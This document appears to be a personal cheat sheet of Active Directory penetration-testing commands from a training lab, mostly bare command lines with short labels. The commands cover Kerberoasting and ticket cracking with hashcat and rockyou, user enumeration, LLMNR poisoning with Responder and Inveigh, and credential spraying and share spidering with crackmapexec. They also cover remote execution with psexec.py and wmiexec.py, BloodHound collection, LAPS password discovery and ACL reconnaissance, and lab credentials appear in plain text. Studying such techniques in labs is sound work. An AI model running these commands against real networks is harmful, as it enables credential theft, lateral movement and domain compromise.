
Domain Groups to be interested in 
Organization management
Exchange Windows Permissions


LINUX
Listing SPN accounts with GetUserSPNs.py
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

Requesting all TGS tickets with GetUserSPNs.py
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request  -outputfile all_tgs
```
Requesting a Single Ticket
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/sqldev -request-user SAPService  -outputfile sapserver_tgs
```
Hashcat  the TGS
```
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```
Testing creds
```
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```




```
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```



```
sudo responder -I ens224
```

Create a target user list
```
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

```
rpcclient -U "" -N 172.16.5.5

enumdomusers
```

No creds
```
crackmapexec smb 172.16.5.5 --users
```
With creds
```
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

```
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

Validating the credentials
```
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

identify logged on users
```
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

```
Identify Shares
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```
Recursive share search
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```
Check access of shares
```
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

```
Recursive search of all directories
```
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

Connect to DC
```
rpcclient -U "" -N 172.16.5.5

you can query RID last four digits of SID and convert to HEX
1111=457
Admin RID 500 = 1f4


queryuser 0x457

For every user
enumdomusers

```

psexec.py
```
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```
wmiexec.py
```
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  

```

Search for Domain admins
```
 python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```
Search for Privileged Users
```
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

Bloodhound
```
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```
start neo4j for bloodhound review
```
sudo neo4j start
```



POWERSHELL below
Windows powershell tool Inveigh
responder like
```
Import-Module .\Inveigh.ps1

Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y


```

PS getting status of Defender
```
Get-MpComputerStatus

```
Get applocker policy
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
Checking powershell contrained language mode
```
$ExecutionContext.SessionState.LanguageMode
```
Find LAPSDelegated groups
```
Find-LAPSDelegatedGroups
```
Find rights on each computer with LAPS enabled for any group with read access and users with all extended rightss
```
Find-AdmPwdExtendedRights
```

```
Get-LAPSComputers
```




Viewing ACL
PS
```
Find-InterestingDomainAcl
```

```
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid damundsen
```

```
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

reverse search
```
$guid= "00299570-246d-11d0-a768-00aa006e0529"

Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```

Resolve gui flag

```
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```

creating a list of Domain Users
```
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```
usesfull for each loop
```
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```


